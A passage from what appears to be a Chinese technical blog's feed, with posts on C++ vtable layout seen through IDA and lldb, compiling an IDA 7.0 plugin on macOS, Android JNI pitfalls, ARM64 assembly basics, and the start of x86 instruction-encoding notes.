std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>IDA7.0 Mac 插件编译指南v1</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/</id>
    <published>2017-11-30T06:25:09.000Z</published>
    <updated>2019-02-21T09:59:22.403Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先说两句"><a href="#先说两句" class="headerlink" title="先说两句"></a>先说两句</h3><p>前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。</p><h3 id="搭建xcode环境"><a href="#搭建xcode环境" class="headerlink" title="搭建xcode环境"></a>搭建xcode环境</h3><p>在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。</p><p>我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_1.jpg?raw=true" alt="xcode_step_1"></p><p>然后再选择为Dynamic动态库，并导入C++标准库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_2.jpg?raw=true" alt="xcode_step_2"></p><p>接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/project_1.jpg?raw=true" alt="project_1"></p><p>这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。</p><h3 id="Build-setting"><a href="#Build-setting" class="headerlink" title="Build setting"></a>Build setting</h3><p>这里我们将设置头文件和库的搜索路径等等。</p><p>首先设置目标架构为x86_64</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/arch_s.jpg?raw=true" alt="arch_s"></p><p>然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/search_s.jpg?raw=true" alt="search_s"></p><p>经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/link_s.jpg?raw=true" alt="link_s"></p><p>这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。</p><p>最后我们还需要设置编译参数</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/macros_s.jpg?raw=true" alt="macros_s"></p><p>其中<code>__EA64__</code>在编译64位插件时才有。</p><p>这时候build一下，如果一切顺利，应该就不会报错了。</p><h3 id="最后说两句"><a href="#最后说两句" class="headerlink" title="最后说两句"></a>最后说两句</h3><p>IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为<strong>findcrypt264.dylib</strong>表示为64位插件，则对应的32位插件名为<strong>findcry.dylib</strong></p><p>下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/test.jpg?raw=true" alt="test"></p><p>上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了<strong>Ctrl-Alt-z</strong>的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>附上该插件，完。</p><p><a href="https://raw.githubusercontent.com/4ch12dy/4ch12dy.github.io/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/findcrypt264.dylib" target="_blank" rel="external">findcrypt264.dylib_for_ida7_made_by_x1a0</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><p><a href="http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html" target="_blank" rel="external">http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html</a></p></li><li><p><a href="http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/" target="_blank" rel="external">http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/</a></p></li><li><p><a href="https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile">https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile</a></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;先说两句&quot;&gt;&lt;a href=&quot;#先说两句&quot; class=&quot;headerlink&quot; title=&quot;先说两句&quot;&gt;&lt;/a&gt;先说两句&lt;/h3&gt;&lt;p&gt;前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因
      
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
      <category term="ida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>Android JNI踩坑笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_%E6%8E%89%E5%9D%91%E7%AC%94%E8%AE%B0%20/JNI/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_掉坑笔记 /JNI/</id>
    <published>2017-11-28T09:00:20.000Z</published>
    <updated>2017-11-29T03:29:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。</p></blockquote></blockquote><h3 id="坑1–jni方法签名分号问题"><a href="#坑1–jni方法签名分号问题" class="headerlink" title="坑1–jni方法签名分号问题"></a>坑1–jni方法签名分号问题</h3><p>这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名</p><pre><code class="c++">jmethodID equals_id = env-&gt;GetMethodID(string_c, &quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;);</code></pre><p>切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。</p><pre><code class="c++">jmethodID iterator_id = env-&gt;GetMethodID(list_c,&quot;iterator&quot;,&quot;()Ljava/util/Iterator;&quot;);</code></pre><p>这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。</p><h3 id="坑2–原生方法包含默认2个参数"><a href="#坑2–原生方法包含默认2个参数" class="headerlink" title="坑2–原生方法包含默认2个参数"></a>坑2–原生方法包含默认2个参数</h3><p>这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数</p><pre><code class="c++">static jboolean nativeFunction(JNIEnv *env, jobject content, jobject someObj){...}</code></pre><p>第一个保留参数为<code>JNIEnv</code>虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。</p><p>由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。</p><p>这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。</p><h3 id="坑3—jni调用父类方法的正确姿势"><a href="#坑3—jni调用父类方法的正确姿势" class="headerlink" title="坑3—jni调用父类方法的正确姿势"></a>坑3—jni调用父类方法的正确姿势</h3><p>这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找<code>Exception</code>这个类的<code>getStackTrace</code></p><p>方法时提示方法找不到错误，调了会才发现这个方法是在其父类<code>Throwable</code>中，所以正确的写法为：</p><pre><code class="c++">    jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);    jclass throwable_c = env-&gt;FindClass(&quot;java/lang/Throwable&quot;);    jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, &quot;getStackTrace&quot;,&quot;()[Ljava/lang/StackTraceElement;&quot;);</code></pre><p>那么怎么调用呢？用<code>CallNonvirtual&lt;XXX&gt;Method</code>去调用父类中的方法，一个调用例子：</p><pre><code class="c++">jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id);</code></pre><p>这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。</p><h3 id="坑4—其他小坑"><a href="#坑4—其他小坑" class="headerlink" title="坑4—其他小坑"></a>坑4—其他小坑</h3><p>写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如<code>jstring</code>与<code>char*</code>的转换，<code>LOGE()</code>函数中参数为<code>char*</code>的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下<code>jni.h</code>头文件就能找到。</p><p>还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的<code>build.gradle</code>文件中在<code>defaultConfig{}</code>加入下面的脚本：</p><pre><code class="c">        sourceSets.main{            jni.srcDirs  &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include&#39;            jniLibs.srcDir &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib&#39;        }</code></pre><p>无非是手动指定了jni相关的文件路径。</p><p>关于下面两类写法：</p><pre><code class="c++">jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);</code></pre><pre><code class="c">jclass exception_c = (*env)-&gt;FindClass(env, &quot;java/lang/Exception&quot;);</code></pre><p>原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。</p><p>继续踩坑去了…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>ARM64基础知识整理</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/21/ARM64%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/ARM64%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/21/ARM64基础知识整理/ARM64基础知识整理/</id>
    <published>2017-10-21T10:07:00.000Z</published>
    <updated>2019-03-08T07:07:58.360Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ARM64基础知识整理"><a href="#ARM64基础知识整理" class="headerlink" title="ARM64基础知识整理"></a>ARM64基础知识整理</h3><h4 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h4><h5 id="参数寄存器-X0-X7"><a href="#参数寄存器-X0-X7" class="headerlink" title="参数寄存器 (X0-X7)"></a>参数寄存器 (X0-X7)</h5><p>参数寄存器，在函数调用的时候传参使用。X0-X7分别对应8个参数，多于8个的参数保存在栈中。</p><h5 id="其他特殊寄存器"><a href="#其他特殊寄存器" class="headerlink" title="其他特殊寄存器"></a>其他特殊寄存器</h5><table><thead><tr><th style="text-align:center">X29(FP)</th><th style="text-align:center">栈帧寄存器  类比x64中rbp</th></tr></thead><tbody><tr><td style="text-align:center">X30(LR)</td><td style="text-align:center">链接寄存器，保存函数返回地址，x64该地址保存在栈中</td></tr><tr><td style="text-align:center">SP</td><td style="text-align:center">栈顶寄存器，类比x64中</td></tr><tr><td style="text-align:center">PC</td><td style="text-align:center">指向下一条指令</td></tr><tr><td style="text-align:center">寄存器</td><td style="text-align:center">描述</td></tr><tr><td style="text-align:center">CPSR</td><td style="text-align:center">状态寄存器</td></tr></tbody></table><h4 id="Instructions"><a href="#Instructions" class="headerlink" title="Instructions"></a>Instructions</h4><ul><li><code>mov</code></li></ul><pre><code class="assembly">  mov x0, x1; copies x1 into x0  mov x1, 0x4141; loads the value 0x4141 in x1</code></pre><ul><li><code>str/ldr</code></li></ul><pre><code class="assembly">str x0, [x29]; store x0 at the address in x29ldr x0, [x29]; load the value from the address in x29 into x0</code></pre><ul><li><code>stp/ldp</code></li></ul><pre><code class="assembly">stp x29, x30, [sp]; store x29 at sp and x30 at sp+8</code></pre><ul><li><code>b/br</code></li></ul><pre><code class="assembly"> br x0; jump to the address stored in x0</code></pre><ul><li><code>ret</code></li></ul><pre><code>Unlike it’s x86 equivalent which pops the return address from stack, it looks for the return address in the x30 register and jumps there.</code></pre><h4 id="Indexing-modes"><a href="#Indexing-modes" class="headerlink" title="Indexing modes"></a>Indexing modes</h4><ul><li>Immediate offset : <code>[base, #offset]</code> - Index an offset directly and don’t mess with anything else</li></ul><pre><code class="assembly">ldr x0, [sp, 0x10]; load x0 from sp+0x10</code></pre><ul><li>Pre-indexed : <code>[base, #offset]!</code> - Almost the same as above, except that base+offset is written back into base.</li></ul><pre><code class="assembly">ldr x0, [sp, 0x10]!; load x0 from sp+0x10 and then increase sp by 0x10</code></pre><ul><li>Post-indexed : <code>[base], #offset</code> - Use the base directly and then write base+offset back into the base</li></ul><pre><code class="assembly">ldr x0, [sp], 0x10; load x0 from sp and then increase sp by 0x10</code></pre><h4 id="函数调用demo分析"><a href="#函数调用demo分析" class="headerlink" title="函数调用demo分析"></a>函数调用demo分析</h4><pre><code class="assembly">__text:000000010004F0D4                 SUB             SP, SP, #0x70__text:000000010004F0D8                 STP             X24, X23, [SP,#0x60+var_30]__text:000000010004F0DC                 STP             X22, X21, [SP,#0x60+var_20]__text:000000010004F0E0                 STP             X20, X19, [SP,#0x60+var_10]__text:000000010004F0E4                 STP             X29, X30, [SP,#0x60+var_s0]__text:000000010004F0E8                 ADD             X29, SP, #0x60__text:000000010004F0EC                 MOV             X19, X0__text:000000010004F0F0                 ADRP            X8, #___stack_chk_guard_ptr@PAGE__text:000000010004F0F4                 LDR             X8, [X8,#___stack_chk_guard_ptr@PAGEOFF]__text:000000010004F0F8                 LDR             X8, [X8]__text:000000010004F0FC                 STR             X8, [SP,#0x60+var_38]__text:000000010004F100                 ADRP            X8, #classRef_Fabric@PAGE__text:000000010004F104                 LDR             X20, [X8,#classRef_Fabric@PAGEOFF]__text:000000010004F108                 NOP__text:000000010004F10C                 LDR             X0, [X8,#classRef_Crashlytics@PAGEOFF] ; void *__text:000000010004F110                 ADRP            X8, #selRef_class@PAGE__text:000000010004F114                 LDR             X1, [X8,#selRef_class@PAGEOFF] ; char *__text:000000010004F118                 BL              _objc_msgSend...__text:000000010004F2F4                 LDP             X29, X30, [SP,#0x60+var_s0]__text:000000010004F2F8                 LDP             X20, X19, [SP,#0x60+var_10]__text:000000010004F2FC                 LDP             X22, X21, [SP,#0x60+var_20]__text:000000010004F300                 LDP             X24, X23, [SP,#0x60+var_30]__text:000000010004F304                 ADD             SP, SP, #0x70__text:000000010004F308                 RET</code></pre><table><thead><tr><th style="text-align:center">地址</th><th style="text-align:center">栈值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">sp=sp-0x70</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x60</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x50</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x40</td><td style="text-align:center">X24/X23</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">sp-0x30</td><td style="text-align:center">X22/X21</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">sp-0x20</td><td style="text-align:center">X20/X19</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">X29 –&gt; sp-0x10</td><td style="text-align:center">X29/X30</td><td style="text-align:center">保存前栈基址和返回地址</td></tr><tr><td style="text-align:center">sp=sp</td><td style="text-align:center"></td><td style="text-align:center">调用前的栈顶地址</td></tr></tbody></table><h4 id="Arm32"><a href="#Arm32" class="headerlink" title="Arm32"></a>Arm32</h4><p><img src="https://azeria-labs.com/downloads/cheatsheetv1.2-1920x1080.png" alt="arm32"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://www.jianshu.com/p/2f4a5f74ac7a" target="_blank" rel="external">https://www.jianshu.com/p/2f4a5f74ac7a</a></li><li><a href="https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start" target="_blank" rel="external">https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start</a></li><li><a href="https://blog.perfect.blue/ROPing-on-Aarch64" target="_blank" rel="external">https://blog.perfect.blue/ROPing-on-Aarch64</a></li><li><a href="https://azeria-labs.com/assembly-basics-cheatsheet/" target="_blank" rel="external">https://azeria-labs.com/assembly-basics-cheatsheet/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ARM64基础知识整理&quot;&gt;&lt;a href=&quot;#ARM64基础知识整理&quot; class=&quot;headerlink&quot; title=&quot;ARM64基础知识整理&quot;&gt;&lt;/a&gt;ARM64基础知识整理&lt;/h3&gt;&lt;h4 id=&quot;Register&quot;&gt;&lt;a href=&quot;#Register&quot;
      
    
    </summary>
    
      <category term="assembly" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/assembly/"/>
    
    
      <category term="ARM64" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ARM64/"/>
    
  </entry>
  
  <entry>
    <title>X86指令编码笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86指令编码笔记/X86指令编码笔记/</id>
    <published>2017-10-11T03:46:13.000Z</published>
    <updated>2019-02-21T10:03:24.082Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。</p></blockquote><h3 id="x86指令编码格式"><a href="#x86指令编码格式" class="headerlink" title="x86指令编码格式"></a>x86指令编码格式</h3><p>很多时候我们都是查阅指令参考页去了解一个指令的含义，但这并不能理解指令的编码格式。而只有学会看懂opcode表的时候才是王道。</p><p>x86是一种CISC指令集，CISC的全称是“Complex Instruction Set Computer”，表示的是一种复杂的指令集，其中一个最重要的复杂性在于在这个指令集中，指令是不定长的，要使得CPU在这种不定长的指令集里面确定每一条指令的含义，就需要一种特定的指令格式，下图显示了<code>Intel 64</code>和<code>IA-32</code>架构下的指令格式，当然，这两种架构所采用的都是x86指令编码：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F.png?raw=true" alt="指令编码格式"></p><p>从上面可以看出，x86指令格式中，由6部分组成，但在这之中只有opcode是必须的，其余都是可选。我们稍后就介绍这些组成部分。</p><h3 id="指令prefix"><a href="#指令prefix" class="headerlink" title="指令prefix"></a>指令prefix</h3><p>prefix简单的说来就是调整内存操作数属性，增强指令的作用等。</p><ul><li><p><code>lock</code> 和 <code>repeat</code></p><p>其中，LOCK prefix保证该条指令对共享内存的访问是独占的；而repeat prefixes 表示这条指令会重复执行多次，直到某个条件满足位置。其中第二种repeat prefix只能用在对string的操作，或者对I/O的操作上。</p></li><li><p><code>operand-size override</code> （<strong>66H </strong>— 